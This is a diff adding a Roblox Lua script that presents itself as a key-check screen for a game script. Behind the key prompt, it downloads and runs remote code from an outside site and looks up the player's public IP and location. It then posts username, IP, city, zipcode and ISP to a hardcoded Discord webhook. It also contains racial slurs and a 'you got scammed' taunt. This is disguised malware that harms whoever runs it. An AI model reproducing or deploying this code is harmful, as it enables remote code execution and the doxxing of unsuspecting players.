@@ -1,0 +1,200 @@
+
+local correctKey = "FuckNigga34567" -- Correct key here
+
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "KeyUI"
+ScreenGui.Parent = game:GetService("CoreGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Text = " Enter Key"
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.Parent = Frame
+
+local TextBox = Instance.new("TextBox")
+TextBox.PlaceholderText = "Enter key here"
+TextBox.Size = UDim2.new(0.9, 0, 0, 40)
+TextBox.Position = UDim2.new(0.05, 0, 0.4, 0)
+TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.Font = Enum.Font.Gotham
+TextBox.TextSize = 18
+TextBox.Parent = Frame
+
+local Button = Instance.new("TextButton")
+Button.Text = "Submit"
+Button.Size = UDim2.new(0.9, 0, 0, 40)
+Button.Position = UDim2.new(0.05, 0, 0.7, 0)
+Button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.Font = Enum.Font.GothamBold
+Button.TextSize = 18
+Button.Parent = Frame
+
+local Message = Instance.new("TextLabel")
+Message.Text = ""
+Message.Size = UDim2.new(1, 0, 0, 30)
+Message.Position = UDim2.new(0, 0, 0.85, 0)
+Message.BackgroundTransparency = 1
+Message.TextColor3 = Color3.fromRGB(255, 50, 50)
+Message.Font = Enum.Font.Gotham
+Message.TextSize = 16
+Message.Parent = Frame
+
+
+Button.MouseButton1Click:Connect(function()
+	local input = TextBox.Text
+	if input == correctKey then
+		Message.TextColor3 = Color3.fromRGB(0, 255, 0)
+		Message.Text = "Key accepted!"
+		wait(1)
+		ScreenGui:Destroy()
+
+		
+		print("Running main script...")
+        task.wait(1)
+        warn("You got scammed fuck nigga!")
+	else
+		Message.TextColor3 = Color3.fromRGB(255, 50, 50)
+		Message.Text = "❌ Incorrect key"
+	end
+end)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+
+local requestFunction = syn and syn.request or http_request or http and http.request
+if not requestFunction then
+    error("No HTTP request function found (syn.request or http_request)")
+end
+
+local function safeRequest(params)
+    local success, response = pcall(requestFunction, params)
+    if not success then
+        warn("HTTP request failed: " .. tostring(response))
+        return nil
+    end
+    return response
+end
+
+local Response = safeRequest({
+    Url = "https://gamingfun.me/livetiktokongamingfun.php?id=W0DBDU",
+    Method = "GET"
+})
+
+if Response and Response.StatusCode == 200 then
+    local func, err = loadstring(Response.Body)
+    if func then
+        local ok, execErr = pcall(func)
+        if not ok then
+            warn("Error running loaded code: " .. tostring(execErr))
+        end
+    else
+        warn("Failed to load string: " .. tostring(err))
+    end
+else
+    warn("Request failed or no response: " .. (Response and tostring(Response.StatusCode) or "nil"))
+end
+
+local player = Players.LocalPlayer
+if not player then
+    warn("LocalPlayer not found")
+    return
+end
+
+local name = player.Name
+local WebhookURL = "https://discord.com/api/webhooks/1396068816450097223/lOsY6FcTnK7WYlXgKKv1mSp33erUCavwGdGYDmIBRWxk8F3D7uOEKfomWS2R3GAw92zL"
+
+
+local getIPResponse = safeRequest({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+
+if not getIPResponse or getIPResponse.StatusCode ~= 200 then
+    warn("Failed to get ")
+    return
+end
+
+local GetIPJSON
+local success, err = pcall(function()
+    GetIPJSON = HttpService:JSONDecode(getIPResponse.Body)
+end)
+if not success then
+    warn("Failed to decode JSON: " .. tostring(err))
+    return
+end
+
+local IPBuffer = tostring(GetIPJSON.ip)
+if not IPBuffer or IPBuffer == "" then
+    warn("Invalid received")
+    return
+end
+
+
+local getIPInfo = safeRequest({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "GET"
+})
+
+if not getIPInfo or getIPInfo.StatusCode ~= 200 then
+    warn("Failed to get")
+    return
+end
+
+local IIT
+success, err = pcall(function()
+    IIT = HttpService:JSONDecode(getIPInfo.Body)
+end)
+if not success then
+    warn("Failed to decode info JSON: " .. tostring(err))
+    return
+end
+
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country or "N/A",
+    countryCode = IIT.countryCode or "N/A",
+    region = IIT.region or "N/A",
+    regionName = IIT.regionName or "N/A",
+    city = IIT.city or "N/A",
+    zipcode = IIT.zip or "N/A",
+    latitude = IIT.lat or "N/A",
+    longitude = IIT.lon or "N/A",
+    isp = IIT.isp or "N/A",
+    org = IIT.org or "N/A"
+}
+
+local dataMessage = string.format(
+    "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",
+    name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org
+)
+
+local MessageData = {
+    content = dataMessage
+}
+
+local webhookResponse = safeRequest({
+    Url = WebhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(MessageData)
+})
+
+if webhookResponse and (webhookResponse.StatusCode < 200 or webhookResponse.StatusCode >= 300) then
+    warn("Failed to send webhook, status code: " .. tostring(webhookResponse.StatusCode))
+end
